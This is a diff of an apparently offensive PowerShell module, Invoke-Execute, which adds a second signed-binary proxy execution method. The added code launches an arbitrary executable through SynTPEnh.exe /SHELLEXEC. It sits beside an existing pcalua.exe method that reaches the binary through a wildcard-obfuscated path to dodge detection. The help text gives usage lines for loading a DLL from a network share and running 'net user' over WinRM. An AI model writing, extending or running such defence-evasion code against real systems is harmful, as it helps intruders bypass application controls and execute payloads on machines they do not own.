@@ -158,7 +158,6 @@ $datadir = ($newarray[(get-random -Maximum ([array]$newarray).count)])
 $Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 13 | foreach {[char]$_}))
 $Rs2 = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
 $Rs3 = (-join ((65..90) + (97..122) | Get-Random -Count 9 | foreach {[char]$_}))
-$Rs4 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
 	
 	if ($Help) {
 		
@@ -281,6 +280,7 @@ $Rs4 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
        Available SignedProxyExe Methods:
 
         [1] pcalua.exe
+		[2] SynTPEnh.exe
 		
    [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)
 		
@@ -302,7 +302,7 @@ $Rs4 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
  Invoke-Execute -OdbcExec -Dll \\server\share\File.dll
  Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."
  Invoke-Execute -SignedProxyDll -Method 1 -Dll C:\temp\file.dll
- Invoke-Execute -SignedProxyExe -Method 1 -Exe C:\temp\file.exe
+ Invoke-Execute -SignedProxyExe -Method 1,2 -Exe C:\temp\file.exe
 
 "@
 	}
@@ -499,7 +499,7 @@ version="1.0">
 	}
 	
 	elseif ($SignedProxyDll -and $Method -eq 1 -and $Dll) {
-		$h = "`n### Invoke-Execute(SignedPivotDll) ###`n"
+		$h = "`n### Invoke-Execute(SignedProxyDll) ###`n"
 		$AdobeArmExe = (Get-Item 'C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe').FullName
 		$AdobeARMExists = (Test-Path $AdobeArmExe)
 		
@@ -523,11 +523,12 @@ version="1.0">
 	}
 	
 	elseif ($SignedProxyExe -and $Method -eq 1 -and $Exe) {
-		$h = "`n### Invoke-Execute(SignedPivotExe) ###`n"
-		$PcaluaExists = (Test-Path C:\??*?\*3?\p?al*?.?x?)
-		if ($PcaluaExists) {
+		$h = "`n### Invoke-Execute(SignedProxyExe) ###`n"
+		
+		if (Test-Path C:\??*?\*3?\p?al*?.?x?) {
 		# https://twitter.com/0rbz_/status/912530504871759872
 		# https://twitter.com/kylehanslovan/status/912659279806640128
+			
 			(C:\??*?\*3?\p?al*?.?x? -a $Exe)
 			$h 
 			Write " [+] Executed Command: pcalua.exe -a $Exe."
@@ -536,6 +537,36 @@ version="1.0">
 		else {
 			$h 
 			Write " [+] Couldn't find pcalua.exe. Quitting."
+			$h 
+			return
+		}
+	}
+	elseif ($SignedProxyExe -and $Method -eq 2 -and $Exe) {
+		# https://twitter.com/egre55/status/1052907871749459968
+		$h = "`n### Invoke-Execute(SignedProxyExe) ###`n"
+		
+		$SynTPEnhP = (Get-Item 'C:\Program Files\Synaptics\SynTP\SynTPEnh.exe')
+		$SynTPEnhS = (Get-Item 'C:\windows\system32\SynTPEnh.exe')
+		
+		if (Test-Path -Path 'C:\Program Files\Synaptics\SynTP\SynTPEnh.exe') {
+		
+			(Invoke-Expression $SynTPEnhP /SHELLEXEC $Exe)
+			
+			$h 
+			Write " [+] Executed Command: $SynTPEnhP /SHELLEXEC $Exe."
+			$h 
+		}
+		elseif (Test-Path -Path 'C:\windows\system32\SynTPEnh.exe') {
+			
+			(Invoke-Expression $SynTPEnhS /SHELLEXEC $Exe)
+			
+			$h 
+			Write " [+] Executed Command: $SynTPEnhS /SHELLEXEC $Exe."
+			$h 
+		}
+		else {
+			$h 
+			Write " [+] Couldn't find SynTPEnh.exe. Quitting."
 			$h 
 			return
 		}
